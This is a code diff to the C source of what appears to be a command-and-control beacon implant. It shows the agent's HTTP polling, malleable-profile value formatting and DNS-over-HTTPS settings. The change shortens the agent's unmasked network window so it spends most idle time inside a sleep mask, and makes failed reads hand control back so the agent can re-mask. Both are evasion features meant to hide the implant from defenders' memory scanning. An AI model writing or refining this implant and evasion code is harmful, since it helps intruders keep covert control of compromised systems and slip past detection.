@@ -81,13 +81,6 @@ static int ci_eq(const char *a, const char *b) {
   return *a == '\0' && *b == '\0';
 }
 
-static void sleep_ms(long ms) {
-  struct timespec ts;
-  ts.tv_sec = ms / 1000;
-  ts.tv_nsec = (ms % 1000) * 1000000L;
-  nanosleep(&ts, NULL);
-}
-
 /* Expand "%s" in a malleable value with the session id. */
 static void fmt_value(c2_str in, const char *session, char *out, size_t cap) {
   size_t o = 0;
@@ -201,6 +194,27 @@ static int pending_append(hp_ctx *h, const uint8_t *data, size_t len) {
   return 0;
 }
 
+/* Keep the unmasked poll window short compared with the beacon interval, so
+ * the agent spends most of its idle time in the stager sleep mask. cc_timeout
+ * bounds a response wait; never let the window exceed half the interval. */
+static long hp_read_timeout_s(const c2_agent_config *cfg) {
+  long timeout = 10;
+  if (cfg->cc_timeout_ms > 0)
+    timeout = ((long)cfg->cc_timeout_ms + 999) / 1000;
+  if (cfg->poll_interval > 0) {
+    long half = cfg->poll_interval / 2;
+    if (half < 1)
+      half = 1;
+    if (timeout > half)
+      timeout = half;
+  }
+  if (timeout < 1)
+    timeout = 1;
+  if (timeout > 90)
+    timeout = 90;
+  return timeout;
+}
+
 static int hp_request(hp_ctx *h, int kind, const uint8_t *body,
                       size_t body_len, uint8_t *resp, size_t resp_cap,
                       size_t *resp_len, long *status) {
@@ -225,7 +239,7 @@ static int hp_request(hp_ctx *h, int kind, const uint8_t *body,
   req.resp_cap = resp_cap;
   req.resp_len = resp_len;
   req.status = status;
-  req.timeout_s = (kind == HP_REQ_READ) ? 90 : 30;
+  req.timeout_s = (kind == HP_REQ_READ) ? hp_read_timeout_s(h->cfg) : 30;
   req.ca_pem = &h->cfg->ca_pem;
   req.doh_server = &h->cfg->doh_server;
 
@@ -255,9 +269,12 @@ static long hp_read(void *ctx, uint8_t *buf, size_t cap) {
     }
     size_t rlen = 0;
     long status = 0;
-    if (hp_request(h, HP_REQ_READ, NULL, 0, resp, 64u * 1024u, &rlen, &status) != 0) {
-      sleep_ms(200); /* transient network error: back off and retry */
-      continue;
+    if (hp_request(h, HP_REQ_READ, NULL, 0, resp, 64u * 1024u, &rlen,
+                   &status) != 0) {
+      /* Read window expired or the network failed. Hand control back so the
+       * agent can close the tunnel and mask; the next beacon reconnects. */
+      free(resp);
+      return C2_STREAM_IDLE;
     }
     if (status == 404) {
       /* The server closed the stream (the Go channel wrapper treats 404 as a
